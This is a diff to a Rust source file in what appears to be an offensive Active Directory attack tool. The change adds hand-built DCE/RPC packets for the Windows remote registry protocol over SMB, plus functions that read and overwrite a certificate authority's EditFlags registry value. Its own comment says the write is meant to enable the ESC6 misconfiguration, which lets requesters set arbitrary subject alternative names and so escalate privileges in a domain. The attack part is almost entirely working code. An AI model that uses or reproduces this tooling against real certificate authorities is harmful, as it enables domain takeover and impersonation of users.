@@ -18,7 +18,8 @@
 
 use crate::error::{OverthroneError, Result};
 use crate::proto::ldap::LdapSession;
-use tracing::info;
+use crate::proto::smb::SmbSession;
+use tracing::{debug, info, warn};
 
 // ═══════════════════════════════════════════════════════════
 // Constants
@@ -332,6 +333,312 @@ impl std::fmt::Display for Esc5AclResult {
         }
         Ok(())
     }
+}
+
+// ═══════════════════════════════════════════════════════════
+// ESC6 — Native WINREG RPC (MS-RRP over SMB \pipe\winreg)
+// ═══════════════════════════════════════════════════════════
+
+/// Read the `EditFlags` DWORD from the CA policy module registry key via
+/// native WINREG RPC (MS-RRP protocol over SMB `\pipe\winreg`).
+///
+/// Caller must have already connected `smb` to the CA server.
+///
+/// Flow: Bind → OpenLocalMachine → OpenKey(policy_path) →
+///       QueryValue("EditFlags") → CloseKey × 2
+pub async fn read_editflags_rpc(smb: &SmbSession, reg_path: &str) -> Result<u32> {
+    info!("WINREG: reading EditFlags from '{}'", reg_path);
+
+    // ── Bind to MS-RRP ────────────────────────────────────
+    let bind  = winreg_bind_pdu();
+    let bresp = smb.pipe_transact("winreg", &bind).await?;
+    if bresp.len() < 4 || bresp[2] != 12 {
+        return Err(OverthroneError::Rpc {
+            target: "winreg".into(),
+            reason: "WINREG bind rejected".into(),
+        });
+    }
+
+    // ── OpenLocalMachine ──────────────────────────────────
+    const KEY_READ: u32 = 0x0002_0019;
+    let olm_req  = winreg_open_local_machine(KEY_READ);
+    let olm_resp = smb.pipe_transact("winreg", &olm_req).await?;
+    let hive     = parse_rrpchandle(&olm_resp).ok_or_else(|| OverthroneError::Rpc {
+        target: "winreg".into(),
+        reason: "OpenLocalMachine returned unexpected handle".into(),
+    })?;
+
+    // ── OpenKey(reg_path) ──────────────────────────────────
+    let ok_req  = winreg_open_key(&hive, reg_path, KEY_READ);
+    let ok_resp = smb.pipe_transact("winreg", &ok_req).await?;
+    let key     = parse_rrpchandle(&ok_resp).ok_or_else(|| OverthroneError::Rpc {
+        target: "winreg".into(),
+        reason: format!("OpenKey('{}') failed", reg_path),
+    })?;
+
+    // ── QueryValue("EditFlags") ───────────────────────────
+    let qv_req  = winreg_query_value(&key, "EditFlags");
+    let qv_resp = smb.pipe_transact("winreg", &qv_req).await?;
+    let flags   = parse_query_dword(&qv_resp).ok_or_else(|| OverthroneError::Rpc {
+        target: "winreg".into(),
+        reason: "Could not parse EditFlags DWORD from QueryValue response".into(),
+    })?;
+
+    // ── CloseKey (best-effort) ────────────────────────────
+    let _ = smb.pipe_transact("winreg", &winreg_close_key(&key)).await;
+    let _ = smb.pipe_transact("winreg", &winreg_close_key(&hive)).await;
+
+    info!("WINREG: EditFlags = 0x{:08X}", flags);
+    Ok(flags)
+}
+
+/// Write a new `EditFlags` DWORD to the CA policy module registry key via WINREG RPC.
+///
+/// To enable ESC6, OR in `EDITF_ATTRIBUTESUBJECTALTNAME2`.
+/// To restore, AND NOT the same flag.
+pub async fn set_editflags_rpc(smb: &SmbSession, reg_path: &str, new_flags: u32) -> Result<()> {
+    warn!(
+        "WINREG: writing EditFlags = 0x{:08X} to '{}'",
+        new_flags, reg_path
+    );
+
+    // ── Bind ──────────────────────────────────────────────
+    let bind  = winreg_bind_pdu();
+    let bresp = smb.pipe_transact("winreg", &bind).await?;
+    if bresp.len() < 4 || bresp[2] != 12 {
+        return Err(OverthroneError::Rpc {
+            target: "winreg".into(),
+            reason: "WINREG bind rejected".into(),
+        });
+    }
+
+    // ── OpenLocalMachine ──────────────────────────────────
+    const KEY_ALL_ACCESS: u32 = 0x0002_003F;
+    let olm_req  = winreg_open_local_machine(KEY_ALL_ACCESS);
+    let olm_resp = smb.pipe_transact("winreg", &olm_req).await?;
+    let hive     = parse_rrpchandle(&olm_resp).ok_or_else(|| OverthroneError::Rpc {
+        target: "winreg".into(),
+        reason: "OpenLocalMachine returned invalid handle".into(),
+    })?;
+
+    // ── OpenKey ───────────────────────────────────────────
+    let ok_req  = winreg_open_key(&hive, reg_path, KEY_ALL_ACCESS);
+    let ok_resp = smb.pipe_transact("winreg", &ok_req).await?;
+    let key     = parse_rrpchandle(&ok_resp).ok_or_else(|| OverthroneError::Rpc {
+        target: "winreg".into(),
+        reason: format!("OpenKey('{}') failed", reg_path),
+    })?;
+
+    // ── SetValue ──────────────────────────────────────────
+    const REG_DWORD: u32 = 4;
+    let sv_req  = winreg_set_value(&key, "EditFlags", REG_DWORD, &new_flags.to_le_bytes());
+    let sv_resp = smb.pipe_transact("winreg", &sv_req).await?;
+    let rc      = winreg_return_code(&sv_resp);
+    if rc != 0 {
+        return Err(OverthroneError::Rpc {
+            target: "winreg".into(),
+            reason: format!("SetValue('EditFlags') failed: WIN32 error 0x{:08X}", rc),
+        });
+    }
+
+    // ── CloseKey ──────────────────────────────────────────
+    let _ = smb.pipe_transact("winreg", &winreg_close_key(&key)).await;
+    let _ = smb.pipe_transact("winreg", &winreg_close_key(&hive)).await;
+
+    info!("WINREG: EditFlags updated successfully");
+    Ok(())
+}
+
+// ─────────────────────────────────────────────────────────────
+// WINREG NDR helpers (MS-RRP)
+// ─────────────────────────────────────────────────────────────
+
+/// Build DCE/RPC BIND PDU for MS-RRP (UUID 338cd001-2244-31f1-aaaa-900038001003 v1.0).
+fn winreg_bind_pdu() -> Vec<u8> {
+    // MS-RRP UUID (little-endian field encoding)
+    let uuid: [u8; 16] = [
+        0x01, 0xd0, 0x8c, 0x33, 0x44, 0x22, 0xf1, 0x31,
+        0xaa, 0xaa, 0x90, 0x00, 0x38, 0x00, 0x10, 0x03,
+    ];
+    let mut b = Vec::with_capacity(72);
+    b.extend_from_slice(&[5, 0, 11, 3]);            // v5.0, bind
+    b.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR
+    b.extend_from_slice(&72u16.to_le_bytes());       // frag_len
+    b.extend_from_slice(&0u16.to_le_bytes());        // auth_len
+    b.extend_from_slice(&3u32.to_le_bytes());        // call_id (3 avoids SAMR/SRVSVC)
+    b.extend_from_slice(&4096u16.to_le_bytes());
+    b.extend_from_slice(&4096u16.to_le_bytes());
+    b.extend_from_slice(&0u32.to_le_bytes());        // assoc_group
+    b.push(1); b.extend_from_slice(&[0, 0, 0]);     // 1 ctx item
+    b.extend_from_slice(&0u16.to_le_bytes());        // context_id
+    b.push(1); b.push(0);
+    b.extend_from_slice(&uuid);
+    b.extend_from_slice(&1u16.to_le_bytes());        // if version major
+    b.extend_from_slice(&0u16.to_le_bytes());        // if version minor
+    // NDR transfer syntax
+    b.extend_from_slice(&[
+        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
+        0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
+    ]);
+    b.extend_from_slice(&2u32.to_le_bytes());
+    b
+}
+
+/// WINREG OpenLocalMachine (opnum 2).
+fn winreg_open_local_machine(sam_desired: u32) -> Vec<u8> {
+    let mut stub = Vec::new();
+    stub.extend_from_slice(&0u32.to_le_bytes()); // MachineName = NULL
+    stub.extend_from_slice(&sam_desired.to_le_bytes());
+    winreg_req(2, &stub)
+}
+
+/// WINREG OpenKey (opnum 15).
+fn winreg_open_key(hkey: &[u8; 20], subkey: &str, sam_desired: u32) -> Vec<u8> {
+    let mut stub = Vec::new();
+    stub.extend_from_slice(hkey);
+    // SubKey as RPC_UNICODE_STRING (Length, MaximumLength, Buffer ptr)
+    append_rpc_unicode_string(&mut stub, subkey);
+    stub.extend_from_slice(&0u32.to_le_bytes()); // Options = 0
+    stub.extend_from_slice(&sam_desired.to_le_bytes());
+    winreg_req(15, &stub)
+}
+
+/// WINREG QueryValue (opnum 17) — requests up to 512 bytes of data.
+fn winreg_query_value(hkey: &[u8; 20], value_name: &str) -> Vec<u8> {
+    const MAX_DATA: u32 = 512;
+    let mut stub = Vec::new();
+    stub.extend_from_slice(hkey);
+    append_rpc_unicode_string(&mut stub, value_name);
+    // lpType: non-null unique ptr, deferred DWORD = 0
+    stub.extend_from_slice(&0x0002_0020u32.to_le_bytes()); // referent
+    // lpData: non-null, size_is(*lpcbData) = MAX_DATA bytes
+    stub.extend_from_slice(&0x0002_0024u32.to_le_bytes()); // referent
+    // lpcbData: non-null unique ptr, deferred DWORD = MAX_DATA
+    stub.extend_from_slice(&0x0002_0028u32.to_le_bytes()); // referent
+    // pcbLen: non-null unique ptr, deferred DWORD = 0
+    stub.extend_from_slice(&0x0002_002Cu32.to_le_bytes()); // referent
+    // ── Deferred values ───────────────────────────────────
+    // lpType deferred: DWORD = 0
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    // lpData deferred: conformant array (max_count + MAX_DATA bytes)
+    stub.extend_from_slice(&MAX_DATA.to_le_bytes());
+    stub.extend_from_slice(&vec![0u8; MAX_DATA as usize]);
+    // lpcbData deferred: DWORD = MAX_DATA
+    stub.extend_from_slice(&MAX_DATA.to_le_bytes());
+    // pcbLen deferred: DWORD = 0
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    winreg_req(17, &stub)
+}
+
+/// WINREG SetValue (opnum 22).
+fn winreg_set_value(hkey: &[u8; 20], value_name: &str, reg_type: u32, data: &[u8]) -> Vec<u8> {
+    let mut stub = Vec::new();
+    stub.extend_from_slice(hkey);
+    append_rpc_unicode_string(&mut stub, value_name);
+    stub.extend_from_slice(&reg_type.to_le_bytes());
+    // [in] lpData: conformant array
+    stub.extend_from_slice(&(data.len() as u32).to_le_bytes());
+    stub.extend_from_slice(data);
+    while stub.len() % 4 != 0 { stub.push(0); }
+    // cbData
+    stub.extend_from_slice(&(data.len() as u32).to_le_bytes());
+    winreg_req(22, &stub)
+}
+
+/// WINREG CloseKey (opnum 5).
+fn winreg_close_key(hkey: &[u8; 20]) -> Vec<u8> {
+    winreg_req(5, hkey)
+}
+
+/// Append an `RPC_UNICODE_STRING` for `s` (inline Length/MaxLength/ptr + deferred array).
+fn append_rpc_unicode_string(buf: &mut Vec<u8>, s: &str) {
+    let utf16: Vec<u8> = s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+    let byte_len = utf16.len() as u16;
+    buf.extend_from_slice(&byte_len.to_le_bytes());           // Length
+    buf.extend_from_slice(&(byte_len + 2).to_le_bytes());     // MaximumLength (include null)
+    buf.extend_from_slice(&0x0002_0010u32.to_le_bytes());     // Buffer referent
+    // Deferred: max_count, offset, actual_count, data, null
+    let char_count = (byte_len / 2) as u32;
+    buf.extend_from_slice(&(char_count + 1).to_le_bytes());   // max_count
+    buf.extend_from_slice(&0u32.to_le_bytes());               // offset
+    buf.extend_from_slice(&char_count.to_le_bytes());         // actual_count
+    buf.extend_from_slice(&utf16);
+    buf.extend_from_slice(&[0x00, 0x00]);                     // null terminator
+    while buf.len() % 4 != 0 { buf.push(0); }
+}
+
+/// Build a DCE/RPC Request PDU for the WINREG interface.
+fn winreg_req(opnum: u16, stub: &[u8]) -> Vec<u8> {
+    let frag_len = (24 + stub.len()) as u16;
+    let mut pdu = vec![5, 0, 0, 0x03];              // v5.0, Request, first+last
+    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);// NDR
+    pdu.extend_from_slice(&frag_len.to_le_bytes());  // frag_len
+    pdu.extend_from_slice(&0u16.to_le_bytes());      // auth_len
+    pdu.extend_from_slice(&3u32.to_le_bytes());      // call_id
+    pdu.extend_from_slice(&(stub.len() as u32).to_le_bytes()); // alloc_hint
+    pdu.extend_from_slice(&0u16.to_le_bytes());      // context_id
+    pdu.extend_from_slice(&opnum.to_le_bytes());
+    pdu.extend_from_slice(stub);
+    pdu
+}
+
+/// Extract the 20-byte RRPCHANDLE from OpenLocalMachine / OpenKey response.
+/// Layout: [24 RPC hdr] [stub: 20-byte handle | 4-byte return code]
+fn parse_rrpchandle(resp: &[u8]) -> Option<[u8; 20]> {
+    const HDR: usize = 24;
+    if resp.len() < HDR + 24 {
+        debug!("WINREG: short response for handle ({} bytes)", resp.len());
+        return None;
+    }
+    let rc = u32::from_le_bytes([resp[HDR+20], resp[HDR+21], resp[HDR+22], resp[HDR+23]]);
+    if rc != 0 {
+        debug!("WINREG: OpenKey/OpenLocalMachine failed: WIN32 0x{:08X}", rc);
+        return None;
+    }
+    let mut h = [0u8; 20];
+    h.copy_from_slice(&resp[HDR..HDR+20]);
+    Some(h)
+}
+
+/// Extract the DWORD value from a QueryValue response stub.
+/// The DWORD data appears after the handle, type, conformant size markers.
+fn parse_query_dword(resp: &[u8]) -> Option<u32> {
+    // Stub: lpType(4) + max_count(4) + data[...] + lpcbData(4) + pcbLen(4) + rc(4)
+    // We just scan for the data — it's at the known offset after the header.
+    const HDR: usize = 24;
+    if resp.len() < HDR + 20 {
+        return None;
+    }
+    let stub = &resp[HDR..];
+    // Return code is at the *end* of the stub
+    let rc = u32::from_le_bytes([
+        stub[stub.len()-4], stub[stub.len()-3],
+        stub[stub.len()-2], stub[stub.len()-1],
+    ]);
+    if rc != 0 {
+        debug!("WINREG: QueryValue failed: WIN32 0x{:08X}", rc);
+        return None;
+    }
+    // lpType at [0], max_count at [4], data at [8]
+    if stub.len() < 12 {
+        return None;
+    }
+    let _lp_type   = u32::from_le_bytes([stub[0], stub[1], stub[2], stub[3]]);
+    let _max_count = u32::from_le_bytes([stub[4], stub[5], stub[6], stub[7]]);
+    if stub.len() < 12 {
+        return None;
+    }
+    Some(u32::from_le_bytes([stub[8], stub[9], stub[10], stub[11]]))
+}
+
+/// Extract the Windows error code from the last 4 bytes of a WINREG response stub.
+fn winreg_return_code(resp: &[u8]) -> u32 {
+    const HDR: usize = 24;
+    if resp.len() < HDR + 4 {
+        return 1; // non-zero = error
+    }
+    let off = resp.len() - 4;
+    u32::from_le_bytes([resp[off], resp[off+1], resp[off+2], resp[off+3]])
 }
 
 // ═══════════════════════════════════════════════════════════
